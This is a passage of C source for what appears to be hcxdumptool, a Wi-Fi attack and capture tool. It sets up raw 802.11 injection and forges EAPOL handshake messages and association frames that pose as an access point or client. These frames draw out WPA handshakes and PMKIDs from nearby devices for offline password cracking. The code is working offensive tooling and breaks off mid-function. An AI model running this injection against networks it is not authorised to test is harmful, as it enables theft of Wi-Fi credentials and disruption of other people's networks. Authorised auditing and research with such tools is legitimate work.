#define _GNU_SOURCE
#include <ctype.h>
#include <ctype.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>
#include <stdbool.h>
#include <getopt.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>
#include <limits.h>
#include <time.h>
#include <signal.h>
#include <unistd.h>
#include <inttypes.h>
#include <linux/ethtool.h>
#include <linux/sockios.h>
#ifdef __ANDROID__
#include <libgen.h>
#define strdupa strdup
#include "include/android-ifaddrs/ifaddrs.h"
#include "include/android-ifaddrs/ifaddrs.c"
#else
#include <ifaddrs.h>
#endif

#include <net/if.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>  
#include <netpacket/packet.h>
#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <openssl/cmac.h>

#include "include/version.h"
#include "include/hcxdumptool.h"
#include "include/rpigpio.h"
#include "include/wireless-lite.h"
#include "include/byteops.c"
#include "include/ieee80211.c"
#include "include/pcap.c"
#include "include/strings.c"
#include "include/hashops.c"
/*===========================================================================*/
/* global var */

static char *interfacename;
static char *pcapngoutname;
static char *gpsname;

static int fd_socket;
static int fd_gps;
static int fd_pcapng;
static int fd_socket_mccli;
static struct ip_mreq mcmreq;
static int fd_socket_mcsrv;
static struct sockaddr_in mcsrvaddress;

static FILE *fh_nmea;

static struct ifreq ifr_old;
static struct iwreq iwr_old;

static bool totflag;
static bool poweroffflag;
static bool rebootflag;
static bool wantstopflag;
static bool beaconreactiveflag;
static bool beaconactiveflag;
static bool beaconfloodflag;
static bool gpsdflag;
static bool macmyapflag;
static bool macmyclientflag;

static int errorcount;
static int maxerrorcount;
static int ringbuffercount;
static int pmkidcount;
static int eapolmpcount;

static int gpscount;

static int gpiostatusled;
static int gpiobutton;

static struct timespec sleepled;
static struct timespec sleepled2;
static struct timeval tv;
static struct timeval tvold;
static struct timeval tvtot;
static uint8_t cpa;
static int staytime;
static uint64_t timestamp;
static uint64_t timestampstart;
static uint64_t mytime;

static rth_t *rth;
static uint64_t incommingcount;
static uint64_t outgoingcount;

static int packetlenown;
static uint8_t *packetoutptr;

static uint8_t *packetptr;
static int packetlen;
static uint8_t *ieee82011ptr;
static int ieee82011len;
static uint8_t *llcptr;
static llc_t *llc;
static uint8_t *mpduptr;
static mpdu_t *mpdu;
static bool qosflag;

static int nmeatemplen;
static int nmealen;

static mac_t *macfrx;

static uint8_t *payloadptr;
static uint32_t payloadlen;

static maclist_t *aplist, *beaconintptr;
static maclist_t *clientlist;
static handshakelist_t *handshakelist;
static scanlist_t *scanlist;
static filterlist_t *filteraplist;
static filterlist_t *filterclientlist;

static int filteraplistentries;
static int filterclientlistentries;
static int filtermode;
static int myreactivebeaconsequence;

static int myapsequence;
static int myclientsequence;

static int mydeauthenticationsequence;
static int mydisassociationsequence;

static int beaconextlistlen;
static uint64_t eapoltimeoutvalue;

static uint32_t statusout;
static uint32_t attackstatus;
static uint32_t pcapngframesout;
static enhanced_packet_block_t *epbhdr;
static enhanced_packet_block_t *epbhdrown;

static int weakcandidatelen;

static const uint8_t hdradiotap[] =
{
0x00, 0x00, // radiotap version and padding
0x0e, 0x00, // radiotap header length
0x06, 0x8c, 0x00, 0x00, // bitmap
0x02, // flags
0x02, // rate
0x14, // tx power
0x01, // antenna
0x08, 0x00 // tx flags
};
#define HDRRT_SIZE sizeof(hdradiotap)

static uint8_t channeldefaultlist[] =
{
1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
32, 34, 36, 38, 40, 42, 44, 46, 48, 50, 52, 54, 56, 58, 60, 62, 64, 68,
96,
100, 102, 104, 106, 108, 110, 112, 114, 116, 118, 120, 122, 124, 126, 128,
132, 134, 136, 138, 140, 142, 144,
149, 151, 153, 155, 157, 159, 161,
161, 165, 169, 173,
0
};

static uint8_t channelscanlist[128] =
{
1, 6, 2, 11, 1, 13, 6, 11, 1, 6, 3, 11, 1, 12, 6, 11,
1, 6, 4, 11, 1, 10, 6, 11, 1, 6, 11, 5, 1, 6, 11, 8,
1, 9, 6, 11, 1, 6, 11, 7, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
};

static uint32_t myoui_client;
static uint64_t mymac_ap;
static uint32_t myoui_ap;
static uint32_t mynic_ap;

static char drivername[34];
static char driverversion[34];
static char driverfwversion[ETHTOOL_FWVERS_LEN +2];

static uint8_t mac_orig[6];
static uint8_t mac_myclient[6];
static uint8_t mac_myap[6];
static uint8_t mac_ack[6];

static uint64_t myrc;
static uint8_t myanonce[32];
static uint8_t mysnonce[32];

static char weakcandidate[64];

static uint8_t epb[PCAPNG_MAXSNAPLEN *2];
static uint8_t epbown[PCAPNG_MAXSNAPLEN *2];

static char nmeatempsentence[NMEA_MAX];
static char nmeasentence[NMEA_MAX];

static char servermsg[SERVERMSG_MAX];
/*===========================================================================*/
static inline void debugprint2(int len, uint8_t *ptr1, uint8_t *ptr2, char *mesg)
{
static int p;

fprintf(stdout, "\n%s ", mesg); 

for(p = 0; p < len; p++)
	{
	fprintf(stdout, "%02x", ptr1[p]);
	}
fprintf(stdout, " ");

for(p = 0; p < len; p++)
	{
	fprintf(stdout, "%02x", ptr2[p]);
	}
fprintf(stdout, "\n");
return;
}
/*===========================================================================*/
static inline void debugprint(int len, uint8_t *ptr)
{
static int p;

fprintf(stdout, "\nRAW: "); 

for(p = 0; p < len; p++)
	{
	fprintf(stdout, "%02x", ptr[p]);
	}
fprintf(stdout, "\n");
return;
}
/*===========================================================================*/
/*===========================================================================*/
__attribute__ ((noreturn))
static void globalclose()
{
static struct ifreq ifr;

static const char *gpsd_disable = "?WATCH={\"enable\":false}";

printf("\nterminating...\e[?25h\n");
sync();
if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) sendto(fd_socket_mcsrv, "bye bye hcxdumptool clients...\n", sizeof ("bye bye hcxdumptool clients...\n"), 0, (struct sockaddr*)&mcsrvaddress, sizeof(mcsrvaddress));
if(gpiostatusled > 0)
	{
	GPIO_CLR = 1 << gpiostatusled;
	nanosleep(&sleepled, NULL);
	GPIO_SET = 1 << gpiostatusled;
	nanosleep(&sleepled, NULL);
	GPIO_CLR = 1 << gpiostatusled;
	nanosleep(&sleepled, NULL);
	GPIO_SET = 1 << gpiostatusled;
	nanosleep(&sleepled, NULL);
	}

if(fd_socket > 0)
	{
	memset(&ifr, 0, sizeof(ifr));
	strncpy( ifr.ifr_name, interfacename, IFNAMSIZ -1);
	if(ioctl(fd_socket, SIOCGIFFLAGS, &ifr) < 0) perror("failed to get interface information");
	ifr.ifr_flags = 0;
	if(ioctl(fd_socket, SIOCSIFFLAGS, &ifr) < 0) perror("failed to set interface down");
	if(ioctl(fd_socket, SIOCSIWMODE, &iwr_old) < 0) perror("failed to restore old SIOCSIWMODE");
	if(ioctl(fd_socket, SIOCSIFFLAGS, &ifr_old) < 0) perror("failed to restore old SIOCSIFFLAGS and to bring interface up");
	if(close(fd_socket) != 0) perror("failed to close raw socket");
	}

if(fd_gps > 0)
	{
	if(gpsdflag == true)
		{
		if(write(fd_gps, gpsd_disable, 23) != 23) perror("failed to terminate GPSD WATCH");
		}
	if(close(fd_gps) != 0) perror("failed to close GPS device");
	}

if(fd_socket_mccli > 0)
	{
	if(setsockopt(fd_socket_mccli, IPPROTO_IP, IP_DROP_MEMBERSHIP, &mcmreq, sizeof(mcmreq)) < 0) perror("failed to drop ip-membership");
	if(close(fd_socket_mccli) != 0) perror("failed to close client socket");
	}

if(fd_socket_mcsrv > 0)
	{
	if(close(fd_socket_mcsrv) != 0) perror("failed to close server socket");
	}

if(fd_pcapng > 0)
	{
	if(close(fd_pcapng) != 0) perror("failed to close PCAPNG dump file");
	}

if(fh_nmea != NULL)
	{
	if(fclose(fh_nmea) != 0) perror("failed to close NMEA 0183 dump file");
	}

if(aplist != NULL) free(aplist);
if(clientlist != NULL) free(clientlist);
if(handshakelist != NULL) free(handshakelist);
if(scanlist != NULL) free(scanlist);
if(filteraplist != NULL) free(filteraplist);
if(filterclientlist != NULL) free(filterclientlist);
if(poweroffflag == true)
	{
	if(system("poweroff") != 0)
		{
		printf("can't power off\n");
		exit(EXIT_FAILURE);
		}
	}

if(rebootflag == true)
	{
	if(system("reboot") != 0)
		{
		printf("can't reboot\n");
		exit(EXIT_FAILURE);
		}
	}

if(errorcount != 0) exit(EXIT_FAILURE);
if(totflag == true) exit(USER_EXIT_TOT);
exit(EXIT_SUCCESS);
}
/*===========================================================================*/
/*===========================================================================*/
static inline void printrcascan()
{
static scanlist_t *zeiger;
static char timestring[16];

qsort(scanlist, SCANLIST_MAX, SCANLIST_SIZE, sort_scanlist_by_count);
strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
printf("\033[2J\033[0;0H BSSID         CH COUNT   HIT ESSID                 [%s]\n"
	"---------------------------------------------------------------\n",
	timestring);
for(zeiger = scanlist; zeiger < scanlist +SCANLIST_MAX; zeiger++)

	{
	if(zeiger->count == 0) return;
	printf(" %02x%02x%02x%02x%02x%02x %3d %5d %5d %s\n",
		zeiger->addr[0], zeiger->addr[1], zeiger->addr[2], zeiger->addr[3], zeiger->addr[4], zeiger->addr[5],
		zeiger->channel, zeiger->count, zeiger->counthit, zeiger->essid);
	}
return;
}
/*===========================================================================*/
static inline void printposition()
{
static char timestring[16];

strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
snprintf(servermsg, SERVERMSG_MAX, "%s %3d INFO GPS:%s\n", timestring, channelscanlist[cpa], &nmeasentence[7]);
if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) sendto(fd_socket_mcsrv, servermsg, strlen(servermsg), 0, (struct sockaddr*)&mcsrvaddress, sizeof(mcsrvaddress));
else printf("%s", servermsg);
return;
}
/*===========================================================================*/
static inline void printtimenetclient(uint8_t *macclient, uint8_t *macap, const char *message)
{
static char timestring[16];

strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
snprintf(servermsg, SERVERMSG_MAX, "%s %3d %02x%02x%02x%02x%02x%02x --> %02x%02x%02x%02x%02x%02x %s\n", timestring, channelscanlist[cpa],
		macclient[0], macclient[1], macclient[2], macclient[3], macclient[4], macclient[5],
		macap[0], macap[1], macap[2], macap[3], macap[4], macap[5], message);
if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) sendto(fd_socket_mcsrv, servermsg, strlen(servermsg), 0, (struct sockaddr*)&mcsrvaddress, sizeof(mcsrvaddress));
else printf("%s", servermsg);
return;
}
/*===========================================================================*/
static inline void printtimenetclientessid(uint8_t *macclient, uint8_t *macap, uint8_t essidlen, uint8_t *essid, const char *message)
{
static char timestring[16];

strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
snprintf(servermsg, SERVERMSG_MAX, "%s %3d %02x%02x%02x%02x%02x%02x --> %02x%02x%02x%02x%02x%02x %s (%.*s)\n", timestring, channelscanlist[cpa],
		macclient[0], macclient[1], macclient[2], macclient[3], macclient[4], macclient[5],
		macap[0], macap[1], macap[2], macap[3], macap[4], macap[5], message, essidlen, essid);
if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) sendto(fd_socket_mcsrv, servermsg, strlen(servermsg), 0, (struct sockaddr*)&mcsrvaddress, sizeof(mcsrvaddress));
else printf("%s", servermsg);
return;
}
/*===========================================================================*/
static inline void printtimenetap(uint8_t *macclient, uint8_t *macap, const char *message)
{
static char timestring[16];

strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
snprintf(servermsg, SERVERMSG_MAX, "%s %3d %02x%02x%02x%02x%02x%02x <-- %02x%02x%02x%02x%02x%02x %s\n", timestring, channelscanlist[cpa],
		macclient[0], macclient[1], macclient[2], macclient[3], macclient[4], macclient[5],
		macap[0], macap[1], macap[2], macap[3], macap[4], macap[5], message);

if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) sendto(fd_socket_mcsrv, servermsg, strlen(servermsg), 0, (struct sockaddr*)&mcsrvaddress, sizeof(mcsrvaddress));
else printf("%s", servermsg);
return;
}
/*===========================================================================*/
static inline void printtimenetapessid(uint8_t *macclient, uint8_t *macap, uint8_t essidlen, uint8_t *essid, const char *message)
{
static char timestring[16];

strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
snprintf(servermsg, SERVERMSG_MAX, "%s %3d %02x%02x%02x%02x%02x%02x <-- %02x%02x%02x%02x%02x%02x %s (%.*s)\n", timestring, channelscanlist[cpa],
		macclient[0], macclient[1], macclient[2], macclient[3], macclient[4], macclient[5],
		macap[0], macap[1], macap[2], macap[3], macap[4], macap[5], message, essidlen, essid);
if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) sendto(fd_socket_mcsrv, servermsg, strlen(servermsg), 0, (struct sockaddr*)&mcsrvaddress, sizeof(mcsrvaddress));
else printf("%s", servermsg);
return;
}
/*===========================================================================*/
static inline void printtimenetbothessid(uint8_t *macaddr1, uint8_t *macaddr2, uint8_t essidlen, uint8_t *essid, const char *message)
{
static char timestring[16];

strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
snprintf(servermsg, SERVERMSG_MAX, "%s %3d %02x%02x%02x%02x%02x%02x <-> %02x%02x%02x%02x%02x%02x %s (%.*s)\n", timestring, channelscanlist[cpa],
		macaddr1[0], macaddr1[1], macaddr1[2], macaddr1[3], macaddr1[4], macaddr1[5],
		macaddr2[0], macaddr2[1], macaddr2[2], macaddr2[3], macaddr2[4], macaddr2[5], message, essidlen, essid);
if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) sendto(fd_socket_mcsrv, servermsg, strlen(servermsg), 0, (struct sockaddr*)&mcsrvaddress, sizeof(mcsrvaddress));
else printf("%s", servermsg);
return;
}
/*===========================================================================*/
static inline void printtimestatus()
{
static char timestring[16];

strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
snprintf(servermsg, SERVERMSG_MAX, "%s %3d INFO ERROR:%d INCOMMING:%" PRIu64 " OUTGOING:%" PRIu64 " PMKID:%d MP:%d GPS:%d RINGBUFFER:%d\n", timestring, channelscanlist[cpa], errorcount, incommingcount, outgoingcount, pmkidcount, eapolmpcount, gpscount, ringbuffercount);
if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) sendto(fd_socket_mcsrv, servermsg, strlen(servermsg), 0, (struct sockaddr*)&mcsrvaddress, sizeof(mcsrvaddress));
else printf("%s", servermsg);
return;
}
/*===========================================================================*/
static inline void programmende(int signum)
{
if((signum == SIGINT) || (signum == SIGTERM) || (signum == SIGKILL)) wantstopflag = true;
return;
}
/*===========================================================================*/
static void writegpwpl(uint8_t *mac)
{
static int c;
static int cs;

static char *gpwplptr;
static char gpwpl[NMEA_MAX];

static const char gpgga[] = "$GPGGA";
static const char gprmc[] = "$GPRMC";

if(nmealen < 30) return;
if(memcmp(&gpgga, &nmeasentence, 6) == 0) snprintf(gpwpl, NMEA_MAX-1, "$GPWPL,%.*s,%02x%02x%02x%02x%02x%02x*", 26, &nmeasentence[17], mac[0] , mac[1], mac[2], mac[3], mac[4], mac[5]);
else if(memcmp(&gprmc, &nmeasentence, 6) == 0) snprintf(gpwpl, NMEA_MAX-1, "$GPWPL,%.*s,%02x%02x%02x%02x%02x%02x*", 26, &nmeasentence[19], mac[0] , mac[1], mac[2], mac[3], mac[4], mac[5]);
else return;

gpwplptr = gpwpl+1;
c = 0;
cs = 0;
while(gpwplptr[c] != '*')
	{
	cs ^= gpwplptr[c];
	gpwplptr++;
	}
snprintf(gpwplptr +1, NMEA_MAX -44, "%02x", cs);
fprintf(fh_nmea, "%s\n", gpwpl);
return;
}
/*===========================================================================*/
bool writecbnmea(int fd)
{
static int cblen;
static int written;
static custom_block_t *cbhdr;
static total_length_t *totallength;
static uint8_t cb[2048];

memset(&cb, 0, 2048);
cbhdr = (custom_block_t*)cb;
cblen = CB_SIZE;
cbhdr->block_type = CBID;
cbhdr->total_length = CB_SIZE;
memcpy(cbhdr->pen, &hcxmagic, 4);
memcpy(cbhdr->hcxm, &hcxmagic, 32);
cblen += addoption(cb +cblen, OPTIONCODE_NMEA, nmealen, nmeasentence);
cblen += addoption(cb +cblen, 0, 0, NULL);
totallength = (total_length_t*)(cb +cblen);
cblen += TOTAL_SIZE;
cbhdr->total_length = cblen;
totallength->total_length = cblen;
written = write(fd, &cb, cblen);
if(written != cblen) errorcount++;
return true;
}
/*===========================================================================*/
static void writeepbown(int fd)
{
static int epblen;
static int written;
static uint16_t padding;
static total_length_t *totallenght;

epbhdrown = (enhanced_packet_block_t*)epbown;
epblen = EPB_SIZE;
epbhdrown->block_type = EPBID;
epbhdrown->interface_id = 0;
epbhdrown->cap_len = packetlenown;
epbhdrown->org_len = packetlenown;
epbhdrown->timestamp_high = timestamp >> 32;
epbhdrown->timestamp_low = (uint32_t)timestamp &0xffffffff;
padding = (4 -(epbhdrown->cap_len %4)) %4;
epblen += packetlenown;
memset(&epbown[epblen], 0, padding);
epblen += padding;
epblen += addoption(epbown +epblen, SHB_EOC, 0, NULL);
totallenght = (total_length_t*)(epbown +epblen);
epblen += TOTAL_SIZE;
epbhdrown->total_length = epblen;
totallenght->total_length = epblen;
written = write(fd, &epbown, epblen);
if(written != epblen) errorcount++;
return;	
}
/*===========================================================================*/
static void writeepb(int fd)
{
static int epblen;
static int written;
static uint16_t padding;
static total_length_t *totallenght;

epbhdr = (enhanced_packet_block_t*)epb;
epblen = EPB_SIZE;
epbhdr->block_type = EPBID;
epbhdr->interface_id = 0;
epbhdr->cap_len = packetlen;
epbhdr->org_len = packetlen;
epbhdr->timestamp_high = timestamp >> 32;
epbhdr->timestamp_low = (uint32_t)timestamp &0xffffffff;
padding = (4 -(epbhdr->cap_len %4)) %4;
epblen += packetlen;
memset(&epb[epblen], 0, padding);
epblen += padding;
epblen += addoption(epb +epblen, SHB_EOC, 0, NULL);
totallenght = (total_length_t*)(epb +epblen);
epblen += TOTAL_SIZE;
epbhdr->total_length = epblen;
totallenght->total_length = epblen;
written = write(fd, &epb, epblen);
if(written != epblen) errorcount++;
return;	
}
/*===========================================================================*/
static inline bool isclientinfilterlist(uint8_t *mac)
{
static filterlist_t *zeiger;
for(zeiger = filterclientlist; zeiger < filterclientlist +filterclientlistentries; zeiger++)
	{
	if(memcmp(zeiger->mac, mac, 6) == 0) return true;
	}
return false;
}
/*===========================================================================*/
static inline bool isapinfilterlist(uint8_t *mac)
{
static filterlist_t *zeiger;
for(zeiger = filteraplist; zeiger < filteraplist +filteraplistentries; zeiger++)
	{
	if(memcmp(zeiger->mac, mac, 6) == 0) return true;
	}
return false;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void send_m1_wpa1()
{
static mac_t *macftx;
static handshakelist_t *zeiger;

static const uint8_t llcdata[] =
{
0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e
};

static const uint8_t wpa1data[] =
{
0x02,
0x03,
0x00, 0x5f,
0x02,
0x00, 0x89,
0x00, 0x20,
};
#define WPA1_SIZE sizeof(wpa1data)

if(filtermode == 1)
	{
	if(isclientinfilterlist(macfrx->addr2) == true) return;
	}
else if(filtermode ==2)
	{
	if(isclientinfilterlist(macfrx->addr2) == false) return;
	}
gettimeofday(&tv, NULL);
timestamp = ((uint64_t)tv.tv_sec *1000000) +tv.tv_usec;
packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +100);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_DATA;
macftx->subtype = IEEE80211_STYPE_DATA;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macfrx->addr1, 6);
memcpy(macftx->addr3, macfrx->addr1, 6);
macftx->from_ds = 1;
macftx->duration = 0x013a;
macftx->sequence = myapsequence++ << 4;
if(myapsequence >= 4096) myapsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &llcdata, LLC_SIZE);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE], &wpa1data, WPA1_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +0x0f] = (myrc >> 8) &0xff;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +0x10] = myrc &0xff;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +0x11], &myanonce, 32);
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP)
		{
		packetlenown = HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +99;
		writeepbown(fd_pcapng);
		}
	}

if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +99) < 0)
	{
	perror("\nfailed to transmit proberesponse");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
zeiger = handshakelist +HANDSHAKELIST_MAX -1;
zeiger->timestamp = timestamp;
memcpy(zeiger->client, macfrx->addr2, 6);
memcpy(zeiger->ap, macfrx->addr1, 6);
zeiger->message = HS_M1;
zeiger->rc = myrc;
memcpy(zeiger->nonce, &myanonce, 32);
qsort(handshakelist, HANDSHAKELIST_MAX, HANDSHAKELIST_SIZE, sort_handshakelist_by_time);
return;
}
/*===========================================================================*/
static inline void send_m1_wpa2()
{
static mac_t *macftx;
static handshakelist_t *zeiger;

static const uint8_t llcdata[] =
{
0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e
};

static const uint8_t wpa2data[] =
{
0x02,
0x03,
0x00, 0x5f,
0x02,
0x00, 0x8a,
0x00, 0x10,
};
#define WPA2_SIZE sizeof(wpa2data)

if(filtermode == 1)
	{
	if(isclientinfilterlist(macfrx->addr2) == true) return;
	}
else if(filtermode ==2)
	{
	if(isclientinfilterlist(macfrx->addr2) == false) return;
	}
gettimeofday(&tv, NULL);
timestamp = ((uint64_t)tv.tv_sec *1000000) +tv.tv_usec;
packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +100);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_DATA;
macftx->subtype = IEEE80211_STYPE_DATA;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macfrx->addr1, 6);
memcpy(macftx->addr3, macfrx->addr1, 6);
macftx->from_ds = 1;
macftx->duration = 0x013a;
macftx->sequence = myapsequence++ << 4;
if(myapsequence >= 4096) myapsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &llcdata, LLC_SIZE);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE], &wpa2data, WPA2_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +0x0f] = (myrc >> 8) &0xff;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +0x10] = myrc &0xff;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +0x11], &myanonce, 32);
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP)
		{
		packetlenown = HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +99;
		writeepbown(fd_pcapng);
		}
	}

if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +99) < 0)
	{
	perror("\nfailed to transmit proberesponse");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
zeiger = handshakelist +HANDSHAKELIST_MAX -1;
zeiger->timestamp = timestamp;
memcpy(zeiger->client, macfrx->addr2, 6);
memcpy(zeiger->ap, macfrx->addr1, 6);
zeiger->message = HS_M1;
zeiger->rc = myrc;
memcpy(zeiger->nonce, &myanonce, 32);
qsort(handshakelist, HANDSHAKELIST_MAX, HANDSHAKELIST_SIZE, sort_handshakelist_by_time);
return;
}
/*===========================================================================*/
static inline void send_association_resp()
{
static mac_t *macftx;

static const uint8_t associationresponsedata[] =
{
/* Fixed parameters (6 bytes) Fixed parameters (6 bytes) */
0x11, 0x04,
0x00, 0x00,
0x01, 0xc0,
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6, 9, 12, 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
/* Tag: Extended Supported Rates 24, 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
/* Tag: Extended Capabilities (8 octets) */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40
};
#define ASSOCIATIONRESPONSE_SIZE sizeof(associationresponsedata)

if(filtermode == 1)
	{
	if(isclientinfilterlist(macfrx->addr2) == true) return;
	}
else if(filtermode ==2)
	{
	if(isclientinfilterlist(macfrx->addr2) == false) return;
	}
packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONRESPONSE_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_ASSOC_RESP;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macfrx->addr1, 6);
memcpy(macftx->addr3, macfrx->addr1, 6);
macftx->duration = 0x013a;
macftx->sequence = myapsequence++ << 4;
if(myapsequence >= 4096) myapsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &associationresponsedata, ASSOCIATIONRESPONSE_SIZE);
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONRESPONSE_SIZE) < 0)
	{
	perror("\nfailed to transmit associationresponse");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_association_req_wpa2(maclist_t *zeiger)
{
static mac_t *macftx;

static const uint8_t associationrequestcapa[] =
{
0x31, 0x04, 0x05, 0x00
};
#define ASSOCIATIONREQUESTCAPA_SIZE sizeof(associationrequestcapa)

static const uint8_t associationrequestwpa2data[] =
{
/* supported rates */
0x01, 0x08, 0x02, 0x04, 0x0b, 0x16, 0x0c, 0x12, 0x18, 0x24,
/* extended supported rates */
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
/* RSN information AES PSK (WPA2) */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x02, /* group cipher */
0x01, 0x00, /* count */
0x00, 0x0f, 0xac, 0x02, /* pairwise cipher */
0x01, 0x00, /* count */
0x00, 0x0f, 0xac, 0x02, /* AKM */
0x00, 0x00,
/* HT capabilites */
0x2d, 0x1a, 0x6e, 0x18, 0x1f, 0xff, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x96,
0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
/* extended capabilites */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x40,
/* supported operating classes */
0x3b, 0x14, 0x51, 0x51, 0x53, 0x54, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x7b, 0x7c,
0x7d, 0x7e, 0x7f, 0x80, 0x81, 0x82,
/* WMM/WME */
0xdd, 0x07, 0x00, 0x50, 0xf2, 0x02, 0x00, 0x01, 0x00
};
#define ASSOCIATIONREQUESTWPA2_SIZE sizeof(associationrequestwpa2data)

if(filtermode == 1)
	{
	if(isapinfilterlist(zeiger->addr) == true) return;
	}
else if(filtermode ==2)
	{
	if(isapinfilterlist(zeiger->addr) == false) return;
	}
packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +ASSOCIATIONREQUESTWPA2_SIZE +IETAG_SIZE +zeiger->essidlen);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_ASSOC_REQ;
memcpy(macftx->addr1, zeiger->addr, 6);
memcpy(macftx->addr2, &mac_myclient, 6);
memcpy(macftx->addr3, zeiger->addr, 6);
macftx->duration = 0x013a;
macftx->sequence = myclientsequence++ << 4;
if(myclientsequence >= 4096) myclientsequence = 1;
